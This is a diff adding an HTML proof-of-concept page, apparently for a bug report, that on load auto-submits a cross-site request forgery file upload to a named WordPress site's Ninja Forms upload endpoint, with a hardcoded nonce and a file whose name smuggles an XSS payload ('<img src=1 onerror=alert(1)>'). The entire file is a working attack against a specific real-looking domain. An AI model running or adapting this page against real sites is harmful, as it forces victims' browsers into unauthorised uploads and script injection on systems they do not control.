@@ -1,0 +1,33 @@
+<html>
+  <head>
+    <title>CSRF Test</title>
+    <script>
+        function setFileName() {
+          var inputFile = document.getElementById("fileInput");
+          var dataTransfer = new DataTransfer(); 
+          var file = new File(["haha"], "blind<img src=1 onerror=alert(1)>.png", { type: "image/svg+xml" }); 
+          dataTransfer.items.add(file); 
+          inputFile.files = dataTransfer.files; 
+        }
+  
+        window.onload = function() {
+          setFileName(); 
+          document.getElementById("csrfForm").submit(); 
+        };
+        history.pushState('', '', '/');
+        document.forms[0].submit();
+      </script>
+  </head>
+  <body>
+    <h2>CSRF File Upload</h2>
+    <form enctype="multipart/form-data" method="POST" action="https://marine.orange.com/wp-admin/admin-ajax.php?action=nf_fu_upload">
+        <input type="hidden" name="form_id" value="8">
+        <input type="hidden" name="field_id" value="65">
+        <input type="hidden" name="nonce" value="6ba3510753">
+        <input type="hidden" name="abort" value="false">
+        <input type="file" id="fileInput" name="files-65[]" value="ss">
+      <br><br>
+      <input type="submit" value="Upload File">
+    </form>
+  </body>
+</html>
